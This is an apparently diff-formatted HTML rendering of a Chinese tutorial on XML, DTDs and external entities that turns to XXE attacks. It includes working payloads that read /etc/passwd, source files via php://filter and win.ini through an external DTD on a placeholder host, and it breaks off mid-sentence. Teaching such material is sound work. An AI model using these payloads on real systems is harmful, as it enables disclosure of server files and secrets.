+<li>XML&#x7528;&#x4E8E;&#x6807;&#x8BB0;&#x7535;&#x5B50;&#x6587;&#x4EF6;&#x4F7F;&#x5176;&#x5177;&#x6709;&#x7ED3;&#x6784;&#x6027;&#x7684;&#x6807;&#x8BB0;&#x8BED;&#x8A00;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6807;&#x8BB0;&#x6570;&#x636E;&#x3001;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x662F;&#x4E00;&#x79CD;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x5BF9;&#x81EA;&#x5DF1;&#x7684;&#x6807;&#x8BB0;&#x8BED;&#x8A00;&#x8FDB;&#x884C;&#x5B9A;&#x4E49;&#x7684;&#x6E90;&#x8BED;&#x8A00;&#x3002;XML&#x6587;&#x6863;&#x7ED3;&#x6784;&#x5305;&#x62EC;XML&#x58F0;&#x660E;&#x3001;DTD&#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;&#xFF08;&#x53EF;&#x9009;&#xFF09;&#x3001;&#x6587;&#x6863;&#x5143;&#x7D20;&#x3002;</li>
+</ul>
+<h2 id="&#x7279;&#x70B9;"><a name="&#x7279;&#x70B9;" class="anchor-navigation-ex-anchor" href="#&#x7279;&#x70B9;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7279;&#x70B9;</h2>
+<ol>
+<li>&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x7EAF;&#x6587;&#x672C;&#xFF0C;&#x4E0D;&#x4F1A;&#x505A;&#x4EFB;&#x4F55;&#x4E8B;&#x60C5;</li>
+<li>&#x53EF;&#x4EE5;&#x53D1;&#x660E;&#x81EA;&#x5DF1;&#x7684;&#x6807;&#x7B7E;</li>
+<li>&#x5B58;&#x50A8;&#x6570;&#x636E;</li>
+</ol>
+<h2 id="&#x6587;&#x6863;&#x7ED3;&#x6784;"><a name="&#x6587;&#x6863;&#x7ED3;&#x6784;" class="anchor-navigation-ex-anchor" href="#&#x6587;&#x6863;&#x7ED3;&#x6784;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x6587;&#x6863;&#x7ED3;&#x6784;</h2>
+<ul>
+<li>XML&#x6587;&#x6863;&#x7ED3;&#x6784;&#x5305;&#x62EC;XML&#x58F0;&#x660E;&#x3001;DTD&#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;&#xFF08;&#x53EF;&#x9009;&#xFF09;&#x3001;&#x6587;&#x6863;&#x5143;&#x7D20;&#x3002;</li>
+</ul>
+<pre><code class="lang-xml"><span class="hljs-comment">&lt;!--XML&#x58F0;&#x660E;--&gt;</span>
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-comment">&lt;!--&#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;--&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE note [  &lt;!--&#x5B9A;&#x4E49;&#x6B64;&#x6587;&#x6863;&#x662F; note &#x7C7B;&#x578B;&#x7684;&#x6587;&#x6863;--&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--&#x5B9A;&#x4E49;note&#x5143;&#x7D20;&#x6709;&#x56DB;&#x4E2A;&#x5143;&#x7D20;--&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--&#x5B9A;&#x4E49;to&#x5143;&#x7D20;&#x4E3A;&#x201D;#PCDATA&#x201D;&#x7C7B;&#x578B;--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--&#x5B9A;&#x4E49;from&#x5143;&#x7D20;&#x4E3A;&#x201D;#PCDATA&#x201D;&#x7C7B;&#x578B;--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--&#x5B9A;&#x4E49;head&#x5143;&#x7D20;&#x4E3A;&#x201D;#PCDATA&#x201D;&#x7C7B;&#x578B;--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--&#x5B9A;&#x4E49;body&#x5143;&#x7D20;&#x4E3A;&#x201D;#PCDATA&#x201D;&#x7C7B;&#x578B;--&gt;
+]]]&gt;</span>
+<span class="hljs-comment">&lt;!--&#x6587;&#x6863;&#x5143;&#x7D20;--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span>
+</code></pre>
+<h2 id="dtd"><a name="dtd" class="anchor-navigation-ex-anchor" href="#dtd"><i class="fa fa-link" aria-hidden="true"></i></a>DTD</h2>
+<ul>
+<li>&#x5185;&#x90E8;&#x58F0;&#x660E;DTD</li>
+</ul>
+<p>&lt;!DOCTYPE &#x6839;&#x5143;&#x7D20; [&#x5143;&#x7D20;&#x58F0;&#x660E;]&gt;</p>
+<ul>
+<li>&#x5F15;&#x7528;&#x5916;&#x90E8;DTD</li>
+</ul>
+<p>&lt;!DOCTYPE &#x6839;&#x5143;&#x7D20; SYSTEM &quot;&#x6587;&#x4EF6;&#x540D;&quot;&gt;</p>
+<ul>
+<li>&#x5185;&#x5916;&#x90E8;DTD&#x6587;&#x6863;&#x7ED3;&#x5408;&#xFF1A;</li>
+</ul>
+<p>&lt;!DOCTYPE &#x6839;&#x5143;&#x7D20; SYSTEM &quot;DTD&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&quot; [&#x5B9A;&#x4E49;&#x5185;&#x5BB9;]&gt;</p>
+<h2 id="dtd&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x91CD;&#x8981;&#x7684;&#x5173;&#x952E;&#x5B57;"><a name="dtd&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x91CD;&#x8981;&#x7684;&#x5173;&#x952E;&#x5B57;" class="anchor-navigation-ex-anchor" href="#dtd&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x91CD;&#x8981;&#x7684;&#x5173;&#x952E;&#x5B57;"><i class="fa fa-link" aria-hidden="true"></i></a>DTD&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x91CD;&#x8981;&#x7684;&#x5173;&#x952E;&#x5B57;</h2>
+<ul>
+<li>DOCTYPE&#xFF08;DTD&#x7684;&#x58F0;&#x660E;&#xFF09;</li>
+<li>ENTITY&#xFF08;&#x5B9E;&#x4F53;&#x7684;&#x58F0;&#x660E;&#xFF09;</li>
+<li>SYSTEM&#x3001;PUBLIC&#xFF08;&#x5916;&#x90E8;&#x8D44;&#x6E90;&#x7533;&#x8BF7;&#xFF09;</li>
+</ul>
+<h2 id="&#x5B9E;&#x4F53;&#x7C7B;&#x522B;&#x4ECB;&#x7ECD;"><a name="&#x5B9E;&#x4F53;&#x7C7B;&#x522B;&#x4ECB;&#x7ECD;" class="anchor-navigation-ex-anchor" href="#&#x5B9E;&#x4F53;&#x7C7B;&#x522B;&#x4ECB;&#x7ECD;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5B9E;&#x4F53;&#x7C7B;&#x522B;&#x4ECB;&#x7ECD;</h2>
+<p>&#x5B9E;&#x4F53;&#x4E3B;&#x8981;&#x5206;&#x4E3A;&#x4E00;&#x4E0B;&#x56DB;&#x7C7B;</p>
+<ul>
+<li>&#x5185;&#x7F6E;&#x5B9E;&#x4F53; (Built-in entities)</li>
+<li>&#x5B57;&#x7B26;&#x5B9E;&#x4F53; (Character entities)</li>
+<li>&#x901A;&#x7528;&#x5B9E;&#x4F53; (General entities)</li>
+<li>&#x53C2;&#x6570;&#x5B9E;&#x4F53; (Parameter entities)</li>
+</ul>
+<p>&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x7528;%&#x5B9E;&#x4F53;&#x540D;&#x79F0;&#x7533;&#x660E;&#xFF0C;&#x5F15;&#x7528;&#x65F6;&#x4E5F;&#x7528;%&#x5B9E;&#x4F53;&#x540D;&#x79F0;</p>
+<p>&#x5176;&#x4F59;&#x5B9E;&#x4F53;&#x76F4;&#x63A5;&#x7528;&#x5B9E;&#x4F53;&#x540D;&#x79F0;&#x7533;&#x660E;&#xFF0C;&#x5F15;&#x7528;&#x65F6;&#x7528;&amp;&#x5B9E;&#x4F53;&#x540D;&#x79F0;</p>
+<p>&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x53EA;&#x80FD;&#x5728;DTD&#x4E2D;&#x7533;&#x660E;&#xFF0C;DTD&#x4E2D;&#x5F15;&#x7528;</p>
+<p>&#x5176;&#x4F59;&#x5B9E;&#x4F53;&#x53EA;&#x80FD;&#x5728;DTD&#x4E2D;&#x7533;&#x660E;&#xFF0C;&#x53EF;&#x5728;xml&#x6587;&#x6863;&#x4E2D;&#x5F15;&#x7528; </p>
+<h1 id="dtd-&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><a name="dtd-&#x5B9E;&#x4F53;&#x58F0;&#x660E;" class="anchor-navigation-ex-anchor" href="#dtd-&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><i class="fa fa-link" aria-hidden="true"></i></a>DTD &#x5B9E;&#x4F53;&#x58F0;&#x660E;</h1>
+<h2 id="&#x5185;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><a name="&#x5185;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;" class="anchor-navigation-ex-anchor" href="#&#x5185;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5185;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;</h2>
+<p>&lt;!ENTITY &#x5B9E;&#x4F53;&#x540D;&#x79F0; &#x201C;&#x5B9E;&#x4F53;&#x7684;&#x503C;&quot;&gt;</p>
+<ul>
+<li>&#x4E00;&#x4E2A;&#x5B9E;&#x4F53;&#x7531;&#x4E09;&#x90E8;&#x5206;&#x6784;&#x6210;:&amp;&#x7B26;&#x53F7;, &#x5B9E;&#x4F53;&#x540D;&#x79F0;, &#x5206;&#x53F7; (;)</li>
+<li>&#x8FD9;&#x91CC;&amp;&#x4E0D;&#x8BBA;&#x5728;GET&#x8FD8;&#x662F;&#x5728;POST&#x4E2D;&#x90FD;&#x9700;&#x8981;&#x8FDB;&#x884C;URL&#x7F16;&#x7801;&#xFF0C;&#x56E0;&#x4E3A;&#x662F;&#x4F7F;&#x7528;&#x53C2;&#x6570;&#x4F20;&#x5165;xml&#x7684;&#xFF0C;&amp;&#x7B26;&#x53F7;&#x4F1A;&#x88AB;&#x8BA4;&#x4E3A;&#x662F;&#x53C2;&#x6570;&#x95F4;&#x7684;&#x8FDE;&#x63A5;&#x7B26;&#x53F7;&#xFF0C;&#x793A;&#x4F8B;&#xFF1A;</li>
+</ul>
+<p>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt; <foo>&amp;xxe;</foo></p>
+<h2 id="&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><a name="&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;" class="anchor-navigation-ex-anchor" href="#&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;</h2>
+<p>&lt;!ENTITY &#x5B9E;&#x4F53;&#x540D;&#x79F0; SYSTEM &#x201C;URI/URL&quot;&gt;</p>
+<ul>
+<li><p>XML&#x4E2D;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x5F15;&#x7528;&#x79F0;&#x4E3A;&#x5B9E;&#x4F53;&#xFF0C;&#x5B9E;&#x4F53;&#x4E2D;&#x6709;&#x4E00;&#x7C7B;&#x53EB;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#xFF0C;&#x7528;&#x6765;&#x5F15;&#x5165;&#x5916;&#x90E8;&#x8D44;&#x6E90;&#xFF0C;&#x6709;SYSTEM&#x548C;PUBLIC&#x4E24;&#x4E2A;&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x8868;&#x793A;&#x5B9E;&#x4F53;&#x6765;&#x81EA;&#x672C;&#x5730;&#x8BA1;&#x7B97;&#x673A;&#x8FD8;&#x662F;&#x516C;&#x5171;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x7684;&#x5F15;&#x7528;&#x53EF;&#x4EE5;&#x501F;&#x52A9;&#x5404;&#x79CD;&#x534F;&#x8BAE;&#xFF0C;&#x6BD4;&#x5982;&#x5982;&#x4E0B;&#x7684;&#x4E09;&#x79CD;&#xFF1A;</p>
+</li>
+<li><p>file:///path/to/file.ext</p>
+</li>
+<li><a href="http://urlphp://filter/read=convert.base64-encode/resource=conf.php" target="_blank">http://url</a></li>
+<li><a href="http://urlphp://filter/read=convert.base64-encode/resource=conf.php" target="_blank">php://filter/read=convert.base64-encode/resource=conf.php</a></li>
+</ul>
+<p>&#x5916;&#x90E8;&#x5F15;&#x7528;&#x53EF;&#x652F;&#x6301;http&#xFF0C;file&#x7B49;&#x534F;&#x8BAE;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x8BED;&#x8A00;&#x652F;&#x6301;&#x7684;&#x534F;&#x8BAE;&#x4E0D;&#x540C;&#xFF0C;&#x4F46;&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x901A;&#x7528;&#x7684;&#x534F;&#x8BAE;</p>
+<p><img src="H:\&#x6709;&#x9053;&#x4E91;&#x4ED3;&#x5E93;\m15581703466_1@163.com\9a88aa9842c54c33a9787a795a85827a\9-1939970161.png" alt="img"></p>
+<p>&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x7684;&#x9ED8;&#x8BA4;&#x534F;&#x8BAE;</p>
+<p>&#x793A;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE xdsec [
+&lt;!ELEMENT methodname ANY &gt;
+&lt;!ENTITY xxe(&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x540D;) SYSTEM &quot;file:///etc/passwd&quot;(&#x5B9E;&#x4F53;&#x5185;&#x5BB9;) &gt;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">methodcall</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">methodname</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">methodname</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">methodcall</span>&gt;</span>
+// &#x8FD9;&#x79CD;&#x5199;&#x6CD5;&#x5219;&#x8C03;&#x7528;&#x4E86;&#x672C;&#x5730;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x6587;&#x4EF6;/etc/passwd&#xFF0C;XML&#x5185;&#x5BB9;&#x88AB;&#x89E3;&#x6790;&#x540E;&#xFF0C;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x4FBF;&#x901A;&#x8FC7;&amp;xxe&#x88AB;&#x5B58;&#x653E;&#x5728;&#x4E86;methodname&#x5143;&#x7D20;&#x4E2D;&#xFF0C;&#x9020;&#x6210;&#x4E86;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x7684;&#x6CC4;&#x9732;&#x3002;
+</code></pre>
+<h2 id="&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><a name="&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x58F0;&#x660E;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x58F0;&#x660E;</h2>
+<p>&lt;!ENTITY % &#x5B9E;&#x4F53;&#x540D;&#x79F0; &#x201C;&#x5B9E;&#x4F53;&#x7684;&#x503C;&quot;&gt;    or    &lt;!ENTITY % &#x5B9E;&#x4F53;&#x540D;&#x79F0; SYSTEM &#x201C;URI&quot;&gt;</p>
+<p>&#x793A;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;
+%xxe;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;evil;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+&#x5916;&#x90E8;evil.dtd&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x3002;
+<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">evil</span> <span class="hljs-attr">SYSTEM</span> &#x201C;<span class="hljs-attr">file:</span>///<span class="hljs-attr">c:</span>/<span class="hljs-attr">windows</span>/<span class="hljs-attr">win.ini</span>&#x201D; &gt;</span>
+</code></pre>
+<h2 id="&#x5F15;&#x7528;&#x516C;&#x5171;&#x5B9E;&#x4F53;"><a name="&#x5F15;&#x7528;&#x516C;&#x5171;&#x5B9E;&#x4F53;" class="anchor-navigation-ex-anchor" href="#&#x5F15;&#x7528;&#x516C;&#x5171;&#x5B9E;&#x4F53;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5F15;&#x7528;&#x516C;&#x5171;&#x5B9E;&#x4F53;</h2>
+<p>&lt;!ENTITY &#x5B9E;&#x4F53;&#x540D;&#x79F0; PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</p>
+<h1 id="&#x4EC0;&#x4E48;&#x662F;xml&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x653B;&#x51FB;"><a name="&#x4EC0;&#x4E48;&#x662F;xml&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x653B;&#x51FB;" class="anchor-navigation-ex-anchor" href="#&#x4EC0;&#x4E48;&#x662F;xml&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x653B;&#x51FB;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x4EC0;&#x4E48;&#x662F;XML&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x653B;&#x51FB;?</h1>
+<ul>
+<li>&#x6709;&#x4E86;XML&#x5B9E;&#x4F53;&#xFF0C;&#x5173;&#x952E;&#x5B57; &quot;SYSTEM&quot; &#x4F1A;&#x4EE4;XML&#x89E3;&#x6790;&#x5668;&#x4ECE;URI&#x4E2D;&#x8BFB;&#x53D6;&#x5185;&#x5BB9;&#xFF0C;&#x5E76;&#x5141;&#x8BB8;&#x5B83;&#x5728;XML&#x6587;&#x6863;&#x4E2D;&#x88AB;&#x66FF;&#x6362;</li>
+<li>&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5B9E;&#x4F53;&#x5C06;&#x4ED6;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x503C;&#x53D1;&#x9001;&#x7ED9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x8BA9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53BB;&#x5448;&#x73B0;</li>
+<li>&#x653B;&#x51FB;&#x8005;&#x5F3A;&#x5236;XML&#x89E3;&#x6790;&#x5668;&#x53BB;&#x8BBF;&#x95EE;&#x653B;&#x51FB;&#x8005;&#x6307;&#x5B9A;&#x7684;&#x8D44;&#x6E90;&#x5185;&#x5BB9;(&#x53EF;&#x80FD;&#x662F;&#x7CFB;&#x7EDF;&#x4E0A;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x4EA6;&#x6216;&#x662F;&#x8FDC;&#x7A0B;&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;&#x6587;&#x4EF6;)</li>
+</ul>
+<p>&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x5C06;&#x83B7;&#x53D6;&#x7CFB;&#x7EDF;&#x4E0A;folder/file&#x7684;&#x5185;&#x5BB9;&#x5E76;&#x5448;&#x732E;&#x7ED9;&#x7528;&#x6237;</p>
+<p>Code1</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&amp;passwd;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<p>Code2</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE b [&lt;!ENTITY entityex SYSTEM &quot;file:///folder/file&quot;&gt;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&amp;entityex;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<p>Code3</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span> 
+<span class="hljs-meta">&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<p>Code4</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<ul>
+<li>&#x4EE5;Code1&#x4EE3;&#x7801;&#x4E3A;&#x4F8B;<ul>
+<li>XML&#x5916;&#x90E8;&#x5B9E;&#x4F53; &quot;passwd&quot; &#x88AB;&#x8D4B;&#x4E88;&#x7684;&#x503C;&#x4E3A;&#xFF1A;file:///etc/passwd</li>
+<li>&#x5728;&#x89E3;&#x6790;XML&#x6587;&#x6863;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5B9E;&#x4F53;&quot;passwd&quot;&#x7684;&#x503C;&#x4F1A;&#x88AB;&#x66FF;&#x6362;&#x4E3A;URI(file:///etc/passwd)&#x5185;&#x5BB9;&#x503C;(&#x4E5F;&#x5C31;&#x662F;passwd&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;)</li>
+<li>&#x5173;&#x952E;&#x5B57;&quot;SYSTEM&quot;&#x4F1A;&#x544A;&#x8BC9;XML&#x89E3;&#x6790;&#x5668;&#xFF0C;&quot;passwd&quot;&#x5B9E;&#x4F53;&#x7684;&#x503C;&#x5C06;&#x4ECE;&#x5176;&#x540E;&#x7684;URI&#x4E2D;&#x8BFB;&#x53D6;&#x3002;</li>
+</ul>
+</li>
+</ul>
+<h1 id="&#x600E;&#x4E48;&#x7504;&#x522B;&#x4E00;&#x4E2A;xml&#x5B9E;&#x4F53;&#x653B;&#x51FB;&#x6F0F;&#x6D1E;"><a name="&#x600E;&#x4E48;&#x7504;&#x522B;&#x4E00;&#x4E2A;xml&#x5B9E;&#x4F53;&#x653B;&#x51FB;&#x6F0F;&#x6D1E;" class="anchor-navigation-ex-anchor" href="#&#x600E;&#x4E48;&#x7504;&#x522B;&#x4E00;&#x4E2A;xml&#x5B9E;&#x4F53;&#x653B;&#x51FB;&#x6F0F;&#x6D1E;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x600E;&#x4E48;&#x7504;&#x522B;&#x4E00;&#x4E2A;XML&#x5B9E;&#x4F53;&#x653B;&#x51FB;&#x6F0F;&#x6D1E;?</h1>
+<ul>
+<li>&#x6700;&#x76F4;&#x63A5;&#x7684;&#x56DE;&#x7B54;&#x5C31;&#x662F;&#xFF1A; &#x7504;&#x522B;&#x90A3;&#x4E9B;&#x63A5;&#x53D7;XML&#x4F5C;&#x4E3A;&#x8F93;&#x5165;&#x5185;&#x5BB9;&#x7684;&#x7AEF;&#x70B9;</li>
+<li><p>&#x4F46;&#x662F;&#x6709;&#x65F6;&#x5019;&#xFF0C;&#x8FD9;&#x4E9B;&#x7AEF;&#x70B9;&#x53EF;&#x80FD;&#x5E76;&#x4E0D;&#x662F;&#x90A3;&#x4E48;&#x660E;&#x663E;</p>
+<ul>
+<li>&#x6BD4;&#x5982;&#xFF0C;&#x4E00;&#x4E9B;&#x4EC5;&#x4F7F;&#x7528;JSON&#x53BB;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x7684;&#x5BA2;&#x6237;&#x7AEF;)&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x4EBA;&#x5458;&#x5C31;&#x5FC5;&#x987B;&#x5C1D;&#x8BD5;&#x4E0D;&#x540C;&#x7684;&#x6D4B;&#x8BD5;&#x65B9;&#x5F0F;</li>
+<li>&#x6BD4;&#x5982;&#x4FEE;&#x6539;HTTP&#x7684;&#x8BF7;&#x6C42;&#x65B9;&#x6CD5;&#xFF0C;&#x4FEE;&#x6539;Content-Type&#x5934;&#x90E8;&#x5B57;&#x6BB5;&#x7B49;&#x7B49;&#x65B9;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x770B;&#x770B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x54CD;&#x5E94;&#xFF0C;&#x770B;&#x770B;&#x7A0B;&#x5E8F;&#x662F;&#x5426;&#x89E3;&#x6790;&#x4E86;&#x53D1;&#x9001;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5982;&#x679C;&#x89E3;&#x6790;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x5219;&#x53EF;&#x80FD;&#x6709;XXE&#x653B;&#x51FB;&#x6F0F;&#x6D1E;&#x3002;<ul>
+<li>&#x4F8B;&#x5982;wsdl&#xFF08;web&#x670D;&#x52A1;&#x63CF;&#x8FF0;&#x8BED;&#x8A00;&#xFF09;&#x3002;&#x6216;&#x8005;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x7684;&#x91C7;&#x7528;xml&#x7684;java&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;spring&#xFF0C;struts2&#xFF09;&#x3002;&#x4E0D;&#x8FC7;&#x73B0;&#x5B9E;&#x4E2D;&#x5B58;&#x5728;&#x7684;&#x5927;&#x591A;&#x6570;XXE&#x6F0F;&#x6D1E;&#x90FD;&#x662F;blind&#xFF0C;&#x5373;&#x4E0D;&#x53EF;&#x89C1;&#x7684;&#xFF0C;&#x5FC5;&#x987B;&#x91C7;&#x7528;&#x5E26;&#x5916;&#x901A;&#x9053;&#x8FDB;&#x884C;&#x8FD4;&#x56DE;&#x4FE1;&#x606F;&#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x653B;&#x51FB;&#x8005;&#x5FC5;&#x987B;&#x5177;&#x6709;&#x4E00;&#x53F0;&#x5177;&#x6709;&#x516C;&#x7F51;ip&#x7684